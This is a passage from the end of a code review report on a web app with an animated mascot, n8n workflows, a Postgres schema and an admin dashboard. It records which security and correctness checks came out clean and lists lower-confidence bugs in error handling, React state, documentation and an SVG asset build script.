  with `view="full"`, and `App.tsx:316` switches `w-full`/`h-full` on `mascotView`. No
  caller pins both axes. (One cosmetic note: with `mascotView: "head"` on a narrow phone,
  `w-full` inside `App.tsx`'s `h-52` box yields roughly 272 px of content in a 208 px box,
  and `<main>`'s `overflow-hidden` clips the top and bottom of the head.)
- **Mascot assets** — every one of the 40 asset names `Mascot2D` requests exists on disk;
  the committed composite SVGs have no dangling `url(#…)` references and no unbalanced
  `<g>`; all three composites share one 1229-byte `<defs>` block. Every member of the
  `Emotion` and `FaceState` unions has an entry in the mascot's lookup tables.
- **Asset upload path traversal** — not possible. `ASSET_SLOTS` and `ASSET_TYPES` in
  `web/ws-server.ts` are strict allowlists and no part of the written filename is
  caller-controlled.
- **`ADMIN_PASSCODE` naming mismatch** — the mismatch recorded in
  `docs/MULTI-TENANT-ARCHITECTURE.md:553` is already fixed on this branch.
  `web/ws-server.ts:45-46` reads both names, and `requireOperator` fails closed with a
  503 rather than waving writes through. (`web/src/lib/branding/store.ts:68`'s docstring
  still describes the old permissive behaviour and is now wrong — worth a one-line doc
  fix.)
- **Admin dashboard SQL** — fully parameterised in `admin_dashboard_workflow.json`. No
  injection.
- **`postgres_init/init.sql`** — idempotent, correctly indexed, and the columns written
  by `Log Session (Postgres)` match the schema exactly. The `id: 0` mapping bug recorded
  in earlier sessions is not present in this export.
- **Committed secrets** — none found in the workflow JSON. (One cosmetic exception:
  `STT Webhook.json:38` carries a literal `Authorization: Bearer YOUR_GROQ_KEY`
  placeholder header alongside the real `httpBearerAuth` credential. It is a dead
  placeholder, not a key, but it reads like one and should be deleted.)
- **Deleted components** — nothing still imports `web/src/components/Header.tsx` or
  `web/src/components/AnimatedFace.tsx`.

---

# 8. Additional lower-confidence observations

Not ranked as findings, but worth a look if you have time after the batches above.

- **`STT Webhook.json:74`** — the `Groq STT` node has no `onError` and no `retryOnFail`.
  A Groq 429 (free-tier rate limit) or an oversized clip aborts the workflow before
  `Guard Language` can produce the `{ text, language, error }` shape the client expects,
  so n8n answers the webhook with its own 500 envelope and the UI's "please try again"
  path is bypassed. Every Gemini HTTP node in `Agent Workflow.json` sets
  `retryOnFail`/`maxTries`; this one does not.
- **`README.md:14` and `:50`** — the setup instructions still tell a new operator to
  import `workflow.json`, which this branch deletes. The four real exports are never
  mentioned. The surrounding text also still lists the removed `ollama` and `piper`
  services and points at `http://localhost:5173`, which is HTTPS-only.
- **`web/src/App.tsx:137`** — the synthetic mouth-animation effect cancels its rAF in
  cleanup but never resets `textSpeaking` / `synthAmplitude`. If a new message arrives
  mid-animation, the effect re-runs, computes `responseArrived = false`, and returns early
  without calling `setTextSpeaking(false)` — so `faceState` reports `"speaking"` while
  `chat.pending` is true and `effectiveAmplitude` stays pinned at the last synth value,
  freezing the mascot's mouth open until the next reply.
- **`web/src/lib/api.ts:282`** — `transcribeAudio` calls `res.json()` with no
  content-type or empty-body guard. When the STT workflow is inactive, n8n answers 200
  with an empty body, `res.ok` passes, and the visitor's toast reads
  `"Unexpected end of JSON input"`. `readReply` (lines 82-95) already handles exactly this
  with a targeted message; `transcribeAudio` bypasses it.
- **`web/src/lib/adminApi.ts:415`** — `saveLexicon` returns `res.lexicon` without checking
  it exists. A response-shape mismatch becomes
  `Cannot read properties of undefined (reading 'version')` inside `cloneLexicon`, which
  lands in `handleSave`'s catch and is shown to the operator as a red "save failed"
  banner — **after Postgres has already been written**. The editor then shows "Unsaved"
  forever and the operator re-saves repeatedly.
- **`web/src/components/admin/AdminApp.tsx:314`** — `overview?.kpis.busiestHour` guards
  `overview` but not `kpis`, unlike the sibling line 299 which correctly does
  `overview?.kpis ?? null`. A 200 response that omits `kpis` throws and takes the whole
  admin route into the ErrorBoundary.
- **`web/src/components/admin/TopQuestions.tsx:44`** (and the identical code at
  `UnknownQuestions.tsx:63`) — the expanded-row state is an array index that is not reset
  when the `items` prop changes. Expanding row 3, then switching the date range, leaves
  the drawer open under whatever question now occupies that index and attributes the wrong
  sample answer to it.
- **`tools/build_mascot_assets.py:187`** — `shared_defs = shared_defs or defs` captures
  the `<defs>` block from the first layer of the first composite and reuses it for every
  layer of every composite, and the byte-identity invariant it depends on is **never
  verified**. On a repack where one layer carries its own gradient, that layer's
  `fill="url(#…)"` resolves to nothing and renders unfilled — the script exits 0 and the
  corruption only shows in the browser. The currently committed output is clean, so this
  is latent, not live. Related: `GUIDE_RE` (line 42) is non-greedy to the first `</g>`, so
  a guide group containing a nested `<g>` leaves a stray closing tag and produces
  unbalanced XML; and the output directory is never cleaned, so a mid-build failure leaves
  a mix of old and new artwork that a `git add -A` would commit.
- **`bg-white/5` survivals** — `Message.tsx:23`, `MessageInput.tsx:195`, `:248`, `:252`,
  and `Sidebar.tsx:46`. On a light tenant surface these render as effectively nothing
  rather than the intended subtle lift.

---

*End of report.*
